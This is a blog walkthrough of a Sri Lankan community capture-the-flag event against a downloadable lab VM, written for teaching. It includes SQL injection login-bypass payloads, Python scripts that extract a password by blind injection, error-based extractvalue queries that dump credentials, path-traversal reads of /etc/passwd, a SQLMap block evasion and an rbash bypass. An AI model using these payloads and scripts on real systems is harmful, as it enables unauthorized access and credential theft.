---
title: Colombo White Hat Security CTF-001 Walk-through
categories:
  - Write-up
tags:
  - CTF
---

# What is CTF-001?

[Colombo White Hat Security](https://www.meetup.com/Colombo-White-Hat-Security/){:target="_blank"} is a group focused on sharing security knowledge with Sri Lankan security enthusiasts and professionals. One objective of this group is to recognize and bring together the individuals interested in security domain and providing them more visibility within the community. This CTF was a part of such effort.

The other intention was purely to give an opportunity to do some hands-on hacking so that all the participants can learn at least few things out of it.

We had exactly **150 players**. There were **20 flags** hidden in the system.

- 62 players (41%) found over 50% of the flags.
- 40 players (26.5%) found over 85% of the flags.
- 24 players (16%) found all the flags!

[Head over to the scoreboard to see the players](https://docs.google.com/spreadsheets/d/1s1YpymVH-2_3A4ka0dcgeUKjiIozsYTULX1e-lTVYuA/edit#gid=0){:target="_blank"}!

# Difficulty

I would rate the complexity of the CTF 7 out of 9 :sweat_smile:. Just kidding... I would say it is 3 out of 10 if you already have some experience with CTFs. For example, if you are a "hacker" at HackTheBox, then this is surely 3/10 or less.

We are planning to make the future CTFs progressively challenging. However, our focus with the 1st CTF was to:

- Get more Sri Lankans interested in the security domain and get them interested in learning, without making the challenges overly complicated at first.
- Provide opportunity to gain the knowledge required in solving the future challenging CTFs.
- Measure the local community interest in CTFs.  

# Audience

A pattern we saw during feedback gathering was that, **more experienced people (who rated difficulty low) were not very happy**. That's completely understandable.

> Try to be hackthebox.eu

There was one feedback that said so. We honestly don't want to do that or compete with HackTheBox. If you want that level of a challenge and if you have the required skill-set, HackTheBox is already there and it's a great platform to practice. I myself am a VIP member.

Not everyone is there yet. The complicated it becomes at first, someone who has the potential to become a great hacker might loose the interest.

Due to the same reason we created multiple paths within the CTF. If a player missed one flag (or one path), s/he can still get at least over 50% of the flags.



> Let's help the new comers to gradually gain the phase. Doing so, we can also increase the presence of Sri Lankans in HackTheBox!
>
> Therefore, if you are an experienced CTF player, please hold-on and bear with us probably until CTF-004.  

# Setup (VirtualBox)

Since the CTF is now over, you can use the VirtualBox (OVA) file available at the following location to setup the CTF server locally.

- [https://ayoma.sgp1.cdn.digitaloceanspaces.com/CTF/ColomboWhuteHatSecurity-CTF-001.ova](https://ayoma.sgp1.cdn.digitaloceanspaces.com/CTF/ColomboWhuteHatSecurity-CTF-001.ova){:target="_blank"}

Use "Import Appliance" option from "File" menu to select the "OVA" file and use the default options to complete the process.

Make sure that you have enabled a "Host-only Adapter" in "Settings" of the imported virtual machine.

![image-20190712171537683](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712171537683.png)

# Walkthrough

It's important to build your own methodology when it comes to solving CTFs. The same methodology can be used (with some twists) during real life penetration test.

## Identifying Host

Since we are using the VirtualBox setup, let's use `ifconfig` to identify the VirtualBox host-only network's IP range:

![image-20190712172039415](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712172039415.png)

We can use `map`, `masscan` or a similar tool to identify the exact IP address of our target machine.

![image-20190712173052017](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712173052017.png)

We can use ping scan to save few seconds here. This will come in handy when you are scanning a large network for active hosts.

```
nmap -sn 192.168.56.0/24 -oG - | grep Up | cut -d' ' -f2
```

![image-20190712173008267](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712173008267.png)

## Enumeration

> Proper enumeration is the key to success. Always enumerate before moving ahead.

If it is a CTF, you may do some basic enumeration first. Thereafter, let the time-consuming checks run in the background (while you do the manual checks on the interest points you found during the basic enumeration).

### Services and Ports

We know for sure that there is a web application running in the CTF server (since URL was published in the announcement). However, we do not know what more is running in the server.

In this case, you had to use `Nmap` earlier to identify the host IP. However, if you did not do a port scan you could have missed the open SSH port.

During CTFs, I usually use the following `Nmap` command to quickly identify any interesting ports and do some basic scans on the identified ports. This command will run all `safe` or `default` NSE scripts, and do version identification.

```
nmap -sV --script=safe,default -oA nmap 192.168.56.106
```

![image-20190712174717903](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712174717903.png)

If you look further down, you might notice that it even revealed the location of one of the flags:

![image-20190712174829181](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712174829181.png)

Since we have some starting points to look at, it's better to run more time consuming enumeration scripts now. Even-though these will not generate any new findings for our target, here are two commands that I usually use for this purpose. These commands will scan all valid ports for both TCP and UDP.

```
nmap -sV --script=safe,default -oA nmapExtendedTCP -p- -vvv <IP>
nmap -sV --script=safe,default -oA nmapExtendedUDP -sU -p- -vvv <IP>
```

### Web Application

Main interesting finding here is the web application made available over the port 80. Navigating to it in the browser reveals the following page.

![image-20190712234623891](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712234623891.png)

During the `Nmap` scan we already saw a hint about the `secret.js` file. However, even if such a hint was not found during the initial enumeration, it is important to go through the source code of the web application. This is manly to understand the structure of the application.

![image-20190712235003626](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712235003626.png)

We immediately see the reference to `secret.js`. If we look at it closer, we can find the Flag 1 there.

![image-20190712235157647](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712235157647.png)

Along with the flag, you see a hint about "re-configuring" the site. Think of a CMS. Where would you go to reconfigure a web application? Probably the admin area.

![image-20190712235412149](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712235412149.png)

Navigating to the `/admin` folder, immediately reveals the Flag 5. We find another hint with it. Precautions admins take can be "copies", "duplicates", "backups", etc. If you try few such URLs you will find the `/backup` folder with the Flag 6. Same screen gives out a backup file.

![image-20190712235755325](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190712235755325.png)

#### Web Application Enumeration Tools
Let's look at the the backup file a little later and see other approaches we could have taken in discovering the hidden folders (`/admin` and `/backup`).

##### Nikto

Nikto is a well known vulnerability scanners focused on web servers. Nikto will immediately identify the two hidden folders, since these are commonly checked interest points.

![image-20190713003641159](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190713003641159.png)

##### GoBuster

Nikto will not be very helpful if the folder that was hidden does not contain a common name. In such case, our option would be to do a wordlist based attack using a much bigger wordlist. GoBusted is a tool that can be used for this purpose:

![image-20190713004152603](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190713004152603.png)

GoBuster can be further configured to discover files with specific file extensions.

![image-20190713004434120](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190713004434120.png)

Apart from directory and file discovery, GoBuster can also performm `dns` and `vhost` discovery.

##### DirBuster

In this CTF it is not necessary to do a recursive check, with which we will attempt to discover more folders and files within the folders we discover during the scan. However, if such a scan is required, DirBuster is a good tool to look at. In a complex CTF, it is better to let this check run as a background enumeration task.

![](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/dirbuster.png)

##### wfuzz

wfuzz is a web application security fuzzer which can be used to send in different values for any component of a HTTP request (methods, header, parts of URL, post data, etc.) and identify different behaviors. Based on such differences (response code, response size, etc.), it is possible to understand how the web application works.

In our case, we just want to identify hidden directories / paths in the application. Wfuzz is clearly an overkill for this purpose, but it's better to familiarize with this tool, since it can become handy in many situations.

With the `-w` flag we are providing the wordlist and with `--hc 4004` we ask wfuzz to "(h)ide HTTP response (c)ode 404" and display all other responses. The word `FUZZ` mentioned at the end of the URL instructs wfuzz to substitute that part of the URL with words from the wordlist.

![image-20190713161106907](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190713161106907.png)

##### rustbuster

This is a tool written in Rust programming language which combines capabilities of most of the tools we discussed so far. It can enumerate `directories`, `dns`, `vhosts` and `IIS 8.3 shortnames` and also it can `fuzz`!

![image-20190713171403370](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190713171403370.png)

#### Which tool?

Even-though there are many options listed here, all these tools have their own strengths. IMO, it's worth familiarize with all of them so that you can easily pick and choose the tool for specific requirement.

However, if your aim is just directory enumeration (without being recursive), here is a performance comparison with 10 threads to test 5000 entry wordlist against our target:

- `rustbuster` -  5.44s user 0.79s system **168**% cpu 3.699 total
- `gobuster` -  0.70s user 0.42s system **34**% cpu 3.177 total
- `wfuzz` - 6.15s user 2.91s system 133% cpu 6.814 total
  - I did not find an option to adjust the thread count here. Not sure if that's possible.

I'd stay with `gobuster` for this type of basic enumeration.

## Explotation

### Web Application

#### Login form

By this point, we have discovered significant amount of information about the web application. However, there was one tempting area what we did not look at. Yes, the login form!

As soon as we see a login form, following are some of the issues that come rushing into mind:

- Is it possible to do username enumeration?
- Is the user "admin", "administrator", "root", etc. valid?
- Is it using SQL, if so is it vulnerable to SQL injection?
- Is session maintained securely?
- Are there anything interesting in cookies?  

Let's check these one after another!

Trying the username `invaluduser` with a random password results in the following error:

![image-20190714021749022](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714021749022.png)

However, if we try the username `admin` with a random password, we get:

![image-20190714021902731](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714021902731.png)

Username enumeration is possible and we know for sure that `admin` user exists in the system.

Before moving into anything, let's check if the form is vulnerable to SQL injections.  Even-thought we might require advanced checks in some cases, the simplest test for SQL injection vulnerability is adding a single-quite to the input and see how the application behaves. Adding an additional single-quote at the end of the password input results in the following error:

![image-20190714022329144](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714022329144.png)

If application does not respond this way for a single-quote, that does not mean that the form is not vulnerable to SQL injection. There can be a blind SQL injection possibility. More about those in a separate post!

> *Note: I am hoping to bring back the blog post that was associated with my session on "[SQL Injection in Depth](https://www.slideshare.net/AyomaWijethunga/sql-injection-in-depth-crash-course){:target="_blank"}". Once done I will update this post with a link.*

Based on the information we have right now and the error that was generated, we can assume that the SQL query should be similar to:

```sql
SELECT * FORM USERS WHERE USERNAME='<username-input>' AND password='<password-input>';
```

When we used the input:

- Username: `admin`
- Password: `somepassword'`

The final query generated was:

```sql
SELECT * FROM USERS WHERE USERNAME='admin' AND password='somepassword'';
```

Notice the two single-quotes shown in the error generated.

Now the most basic attack would be to try the following input:

- Username: `admin`
- Password: `' OR 1=1 #`

This will result in the following query (# is used to comment the additional single-quote):

```sql
SELECT * FROM USERS WHERE USERNAME='admin' AND password='' OR 1=1 #';
```

We may use the following attack pattern too (note that there is a space after "--"):

- Username: `admin`
- Password: `' OR 1=1 --  `

![image-20190714025410582](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714025410582.png)

We got the Flag 2!

##### Username or password?

It is also possible to do the injection on the `username` field. Even-thought it is fine in this CTF, if you attack the `username` field you might end up getting authenticated as a low-privileged user. In our case, if we attacked the username field the attack query would look like:

```sql
SELECT * FROM USERS WHERE USERNAME='' OR 1=1 # AND password='somepassword';
```

This query will result in selecting the entire `USERS` table and application may pick the first row of the dataset to do the authorization checks. If the first user in this result set is a low-privileged user, you might miss some interesting features.

Therefore, it is always better to identify high privileged user accounts first and then attack the password field. If that is not possible and if you are getting a low-privileged account when injecting to username field, it is also possible to play around with sort order to land on an admin account.

##### SQL injections tools?

Yes, we can use `SQLMap` or a similar tool to identify if the login form is vulnerable to SQL injections. However, I highly recommend trying different SQL injection patterns manually. This will help you understand different query patterns and master SQL injection techniques. If manual attempts are failing you can use an automated tool.

`SQLMap` is a very noisy tool. Using it in a CTF is fine, but during a real-life penetration test or specially in a red-teaming attempt, the traffic generated by `SQLMap` is very suspicious and can generate many alerts in the monitoring systems.

In this environment, `SQLMap` is blocked:

![image-20190714030313445](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714030313445.png)

![image-20190714030331215](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714030331215.png)

However, if we use random user-agents during the attack everything will work as expected. Blocking has been done based on the user-agent sent by `SQLMap`:

![image-20190714030651456](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714030651456.png)

When `SQLMap` says a target is vulnerable, it is most certainly vulnerable. However, when `SQLMap` says a target is not vulnerable, do not always believe its results without doing a manual verification. I have seen that some types of blind injections, including time-based injections are not properly identified, even though the application is actually vulnerable.

#### Cookies?

If we look at the cookies used by the application, we notice the usual JSESSIONID cookie used in Java based web applications. Value of this cookie is generally safe and random enough. However, there is another cookie with the name `authData` which seems to contain Base64 encoded value (judging by the "==" at then end).

![image-20190714031445939](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714031445939.png)

If we decode this value, we get the Flag 19:

![image-20190714031857869](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714031857869.png)

Even-thought we used browser's developer console to look at the cookie value here, it is always better to keep a proxy like `BurpSuite` running in the background during a CTF to:

- Identify interesting requests and responses
- Inspect and repeat interesting requests at a later time
- Analyze strength of session IDs

#### Local file inclusion (LFI)

If we had `BurpSuite` running in the background or if we look at the requests sent during the initial page load using browser's developer-console, we will notice the following interesting request made to load an image:

![image-20190714032734830](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714032734830.png)

We can use  `curl` to do the same request:

![image-20190714033455060](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714033455060.png)

What if we try to retrieve a directory?

![image-20190714033927849](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714033927849.png)

Now we know that the image was stored in `/usr/local/tomcat/secretimagefolder_a5ty2/` and we know that tomcat is running from `/usr/local/tomcat/`.

If we try to read a random file we get a base64 encoded hint about a flag:

![image-20190714034110221](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714034110221.png)

![image-20190714034200357](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714034200357.png)

Using  `../` to navigate back from the folder we are locked in and retrieving the target file will give us the Flag 9.

![image-20190714034420965](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714034420965.png)

We get Flag 7 by trying to read the `/etc/passwd` file which is used to maintain OS users in *nix.

![image-20190714033648025](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714033648025.png)

We should be able to get the source files of the application by exploring the Tomcat deployment folder. Having the source files can be important in identifying the remaining flags.

We know that the image is in `/usr/local/tomcat/secretimagefolder_a5ty2/`. Therefore to get into Tomcat root folder we need to input `../`. To get into the deployment folder we need to input `../webapps`. Since this application seems to be using the ROOT context, let's check if the source files are inside the ROOT with input: `../webapps/ROOT/index.jsp`.

![image-20190714035100833](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714035100833.png)

That should have worked, if it wasn't blocked. We got the Flag 8 for trying!

##### Unintended Paths

During an internal run of the same CTF, we discovered that some players looked at Tomcat access-logs to identify how other people reached certain flags. These logs are available at `/usr/local/tomcat/logs`. In addition, to get the source files of the JSP files, some players looked at the `/usr/local/tomcat/work` directory.

These paths were blocked in the public run of the CTF to prevent unintended paths to the solutions and also to prevent availability impacts.  However, we gave out the Flag 8 if any of these patterns were tried.

> These are very interesting approaches. When you come across a server application you are not fully aware of, it is important to run an instance of it locally and identify how it behaves.

### Image Steganography

Let's move back a little and look at images we saw across the challenge and see if there is anything hidden. On the home page of the web application, we have this image:

![image-20190714091032282](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714091032282.png)

Apart from what you generally see in an image file, there can be metadata stored within. For example, an image file may contain information about the software that was used to create the image, author information, copyright information, etc. EXIF (Exchangeable image file format) is one standard for embedded such information in media files.

`exiftool` is a popular tool that can read and write [different types of metadata related to different file formats](https://www.sno.phy.queensu.ca/~phil/exiftool/#supported){:target="_blank"}.  If we use `exiftool` with the image, we can get the Flag 4 hidden inside the copyright information of the image.

![image-20190714091934681](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714091934681.png)

In PNGs this information is stored in plain text, therefore you may also `cat` the file or open the file in a hex editor to get the same information.   

![image-20190714092236627](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714092236627.png)

![image-20190714092342794](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714092342794.png)

Metadata also contains a hint about the next flag. If we do a search on the word "stylesuxx", we'll come across: https://stylesuxx.github.io/steganography/ which is a tool that can be used to hide / encode a message into an image.  

`StegHide` is the tool usually used for this purpose in CTFs. However, since getting `StegHide` running in Mac is bit tricky, we thought to use an online tool which everyone can access. When you solve other CTFs keep `StegHide` in check!

We get the Flag 14 by decoding the image using the online tool.

![image-20190714093007442](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714093007442.png)

### Different Programming Languages

We saw another image after we logged into the application. Let's have a closer look at it. No interesting meta-data.

![image-20190714093327478](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714093327478.png)

The site says, it's Turing complete, which implies that there maybe something to do with a programming language. If we have another closer look, we notice that the file name is `piet.pnm.png`. Bit of further research shows that there is a programming language called `piet`, which uses colors and color differences to store instructions.

A `npiet` interpreter is available online at [https://www.bertnase.de/npiet/npiet-execute.php](https://www.bertnase.de/npiet/npiet-execute.php){:target="_blank"}. We can use this tool to recover the Flag 20.

![image-20190714094112213](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714094112213.png)

It'll be interesting to have an idea about other weird programming languages like `Piet`. Go through following three pages and make sure you can recognized a code written in one of these languages:

- [http://trove42.com/top-20-strangest-programming-languages/](http://trove42.com/top-20-strangest-programming-languages/)
- [http://trove42.com/top-20-strangest-programming-languages-2/](http://trove42.com/top-20-strangest-programming-languages-2/)
- [http://trove42.com/top-20-strangest-programming-languages-3/](http://trove42.com/top-20-strangest-programming-languages-3/)

Did you notice anything interesting? Yes, the gibberish notation we saw in the home page of the web application is actually a `Brainf__k` code.

![image-20190714094651762](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714094651762.png)

You can use one of the many interpreters out there to run that program and recover Flag 18.

![image-20190714094927623](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714094927623.png)

### Exploring the Backups

In side the `/backup` folder, we found an iso/dmg file. Let's move back there and see what is inside. Let's mount the image using a tool we are comfortable with. We find the Flag 15 immediately:

![image-20190714095349756](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714095349756.png)

There are some hidden folders inside. Use `ls -la` to see those and navigate inside. `.Trash` is the folder used to stored deleted files in Mac. These folders can contain interesting information. In this case, we find Flag 13:

![image-20190714095612791](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714095612791.png)

There are 1000 files inside `.hidden` folder. All the files seems empty. However, if we use `ls -laS` we can sort all the files by file-size and identify that there is one file with some data.

![image-20190714095733408](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714095733408.png)

Let's look at that file and let's do a `bash` one liner here just to learn more out of it. We find Flag 11 and some login information!

![image-20190714100154203](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714100154203.png)

### Shell Access

Since we did good amount of enumeration on the machine, we know that there is `SSH` port open. Let's check if we can use the credentials we found here to get a shell:

![image-20190714100447382](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714100447382.png)

After login to `SSH` we can recover the Flag 12 stored in the home folder.

### Binary Analysis

There is `hackme` binary which is also interesting, but we cannot explore much since `rbash` is used to restrict the commands you can run:

![image-20190714100700433](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714100700433.png)

Let's just run the binary and see what happens. If you are new to binary analysis, there is small hint there too:

![image-20190714101031943](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714101031943.png)

`strace` is a tool that can be used to trace system calls made by a program. In this case we do not find anything useful in system call traces:

![image-20190714101236179](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714101236179.png)

`ltrace`  is a tool that can be used to trace library calls made by a program. This tool will show that we are making a call to the `strcmp` library call to compare if the input user provide is equivalent to some secret value.

![image-20190714101328977](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714101328977.png)

`ltrace` trim down longer strings. Let's increase the length and use the recovered password to get the Flag 17:

![image-20190714101551263](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714101551263.png)

Based on the hint we got earlier, we know that there are 2 flags hidden in the binary. It's important to check if the binary is vulnerable to buffer overflow. Doing this check will get us the Flag 16.

![image-20190714101747438](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714101747438.png)

#### Alternate Approaches

- We can also use `scp` to copy the hackle binary stored in the home folder and then use any reverse engineering tool or a debugger to recover both flags.
- It is possible to by-pass `rbash`  by forcing a different shell on the ssh session. Thereafter you can use `xxd` to look at the binary. Since `strings` command cannot be used to extract the flags (they are stored in char[]), we saw that some players used `xxd` to manually put together the Flag 16.

![image-20190714102255214](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714102255214.png)

### Last two flags - Back to SQL Injection

#### Boolean Based Injection

Flag 3 is somewhat challenging if we keep away from using `SQLMap`. During the CTF, a hint was provided that the Flag 3 is the password of the other user in the system (not the 'admin'). My advice is to keep away from `SQLMap` and do it manually on your own.

What if we brute-force the password. Let's use the following value as the username:

```sql
notauser' OR username != 'admin' AND password like 'a%' #
```

This will result in the following SQL query, selecting the non-admin user and logging-in if that user's password starts with letter "a":

```sql
SELECT * FROM USERS WHERE username='notauser' OR username != 'admin' AND password like 'a%' # AND password ='abc';
```

Running this query will result in "Invalid Username" error. We know for sure that the password of the non-admin user starts with letter "f" (since it's a flag). Therefore, we can check if our injections works by giving the below input as the username.

```sql
notauser' OR username != 'admin' AND password like 'f%' #
```

We could log-in!

Based on the difference between the two behaviors, it's not possible to script a brute-force attack:

```python
import requests
import urllib.parse
import itertools as it

target = 'http://192.168.56.106/index.jsp'

debug = 1
trace = 0

# If long successful, response should contain word "Turing".
def check(req):
    if(trace):
        print(req.content)

    if(str(req.content).find("Turing") == -1):
        return False
    else:
        return True

req = requests.get(target)
if req.status_code != requests.codes.ok:
    raise ValueError('Unable to connect to target')

totalQueryCount = 0
answer = 'flag:no3:{'
for i in range(0, 41):
    for asciiCode in it.chain(range(48,58), range(65,91)):
        try:
            if (trace):
                print("Checking for character " + chr(asciiCode))
            req = requests.get(target + "?submit=&password=abc&username="
                + urllib.parse.quote("notauser' OR username != 'admin' AND password like '")
                + answer + chr(asciiCode) + urllib.parse.quote("%}' #"))

            totalQueryCount = totalQueryCount + 1
            if (check(req) == True) :
                answer += chr(asciiCode)
                print("Answer > " + answer)
                break;
        except ValueError:
            break

answer = answer + "}"
print("Answer !> " + answer)
print("Total query count: " + str(totalQueryCount))
```

![image-20190714112345907](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714112345907.png)

We can improve this script a bit to reduce the number of queries that we have to make. Let's use binary-search here:

```python
import requests
import urllib.parse

target = 'http://192.168.56.106/index.jsp'
attackVector = 'ascii(substring((select upper(password) from USERS where username != \'admin\'),_pos_,1)) <= _check_'
debug = 1
trace = 0

# If long successful, response should contain word "Turing".
def check(req):
    if(trace):
        print(req.content)

    if(str(req.content).find("Turing") == -1):
        return False
    else:
        return True

req = requests.get(target)
if req.status_code != requests.codes.ok:
    raise ValueError('Unable to connect to target')

totalQueryCount = 0

answer = 'flag:no3:{'
pos = 11
mid = 0
while (True):
    lo = 1
    hi = 91
    temp = -1

    if(trace):
        print("Checking for character " + str(pos))

    while (lo <= hi):
        mid = int((lo + hi) / 2)
        req = requests.get(target +
            "?submit=&password=abc&username=" + urllib.parse.quote("notauser' OR username != 'admin' AND " +
            attackVector.replace("_pos_",str(pos)).replace("_check_", str(mid))+ " #"))
        totalQueryCount = totalQueryCount + 1
        if (check(req)):
            hi = mid-1
            temp = mid
        else:
            lo = mid+1
    if (hi == 0): break
    answer += chr(temp)
    if (pos == 40 + 10):
        answer = answer + "}"
        print("Answer !> " + answer)
        break
    if (debug):
        print("Answer > " + answer)
    pos += 1

print("Total query count: " + str(totalQueryCount))

```

![image-20190714112525797](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714112525797.png)

In case you were curious, we can dump entire database using `SQLMap` too. But wasn't it fun to do it manually on our own, knowing what we are really doing?

![image-20190714112631839](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714112631839.png)

![image-20190714112646491](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714112646491.png)

#### Error Based Injection

Some players used error-based SQL injection techniques to recover the password.

 `extractvalue` is a MySQL function commonly used for error based injections. Usage of this function is to extract a value from a XML, based on a provided XPath expression. When we provide a query as the XPath expression, and if the result of the query is not a valid XPath, MySQL will return an error with the value generated after evaluating the query provided as the XPath. This error can be used to exfoliate information,

Here are the values [Sivakumar Prakhash](https://www.linkedin.com/in/prakhashsiva/){:target="_blank"} used as the username to extract more information:

Extract database name:

```
1' and extractvalue(0x0a,concat(0x0a,(select database())))-- -
```

![image-20190714114141498](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714114141498.png)

Extract table name:

```
1' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
```

![image-20190714114249006](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714114249006.png)

Extract column names of the `USERS` table:

```
1' and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='USERS' limit 1,2)))-- -
```

![image-20190714114319019](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714114319019.png)

Extract the number of users from the `USERS` table:

```
1' and extractvalue(0x0a,concat(0x0a,(select count( username) from USERS)))-- -
```

![image-20190714114349144](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714114349144.png)

Extract 2nd user's username:

```
1' and extractvalue(0x0a,concat(0x0a,(select username from USERS limit 1,2)))-- -
```

![image-20190714114727482](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714114727482.png)

Extract first half of the 2nd user's password:

```
1' and extractvalue(0x0a,concat(0x0a,(select SUBSTRING(password,1) from USERS limit 1,2)))-- -
```

![image-20190714114758335](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714114758335.png)

Extract second half of the 2nd user's password:

```
1' and extractvalue(0x0a,concat(0x0a,(select SUBSTRING(password,25) from USERS limit 1,2)))-- -
```

![image-20190714115053875](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714115053875.png)

#### More from MySQL?

What more interesting information can be found in MySQL?

We only have Flag 10 left. The `jailed` user account was not a privileged user account. We might be able to gain command execution using MySQL if we could get access to the MySQL root user account. In order to do so, we need to read users from `mysql.user` table. We can change our brute force script or use some other technique to read these values. However, as soon as you try one of the blocked keywords (timeout, sleep, mysql, drop, update, delete or "\\"), you'll get the Flag 10. Intention here is to give out a flag to the users that try extra fishy query.

![image-20190714113532200](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/image-20190714113532200.png)

We have all 20 flags!

> If you used an unintended approach that is not mentioned here to get any of the flags, please mention that in a comment.
>
> It's important that we all learn from you!

# Feedback

Here is how participants who responded to the feedback form responded, which aligns with my rating:

![](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/Screen Shot 2019-07-11 at 5.50.48 PM.png)

Here is how participants rated the learning experience of the CTF, which proves that we achieved the target we aimed for:

![](/assets/images/2019-07-11-colombo-white-hat-security-ctf001-walk-through/Screen Shot 2019-07-11 at 5.51.14 PM.png)



Here are few comments we got and found very helpful in understanding what our audience thought about the CTF:

> This's my first time and I don't have any clue with what to do. Some hint came handy with going deep and learning stuff. Since it's suit for me with the difficulty I kept going.

> Keep it up. Make next CTF focus on Web Application base very latest vulnerabilities/exploits. That's will help us learn more.

> This was very interesting challenge. I love the challenge design that's coverd coverage a wide range of vulnerability in 20 challenges. It was a great adventure  and a good start for all the CTF played in SL. Please share a guide on this so it will be helpful for all the new Conners.

> It was a good learning experinece and training. Please conduct more and more sessions.

> It's awesome. I could find all 20 flags. Most challenging part was 8th one. I learned many new things from the CTF. But it would better if there was real vulnerabilities. I expected more on binary exploitation. Thank you for the great work.

> It was really good and it was a great experience. Hope you give longer time or let us know in way advanve so we can manage our time. As most of us are working we dont get much time to work on it in weekdays so its essential for ud that we get to work on it in the weekend.other than that its a great job.keep it up

> This was a great opportunity to learn stuff. This's my first time participating a CTF and had a great experience. I have learned a lot and it was very interesting.
> since this's my first I don''t see any bad about this CTF.

> try to be hackthebox.eu, and get the help and information hackthebox players. thank your team.

> Need to proper flow to attack the system. There is no flow going on the ctf

> Lesser hints

Based on these ratings and comments we got:

> We are more than happy about the final result.
>
> We are convinced that continuing the CTF is worth.

# Future CTFs?

Here is the plan:

- Make the future CTFs gradually difficult and provide lesser hints.
- A CTF happens once per 2 months. The frequency will be changed based on the interest patterns.
- Keep the CTF open for 1 week (including a weekend).

- As we progress, instead of limiting to CTF like challenges, use real vulnerabilities and realistic challenges. This includes:
  - Vulnerable versions of generally used software.
  - Protocol level vulnerabilities (Ex: SAML, OAuth2, OIDC, JWT & SSL/TLS security weaknesses).
  - Misconfigurations of services we do not see often in CTFs (Ex: Docker, Kubernetes)
  - Realistic:
    - Reverse engineering challenges.
    - Traffic and log analysis challenges.
    - Forensic challenges.
- Since we are a local community we can also do hardware CTFs (similar to "Riscure Embedded Hardware CTF").
- Do a live streamed session with a Q&A session to increate the community interaction and to being the players together.

## Gifts & Awards

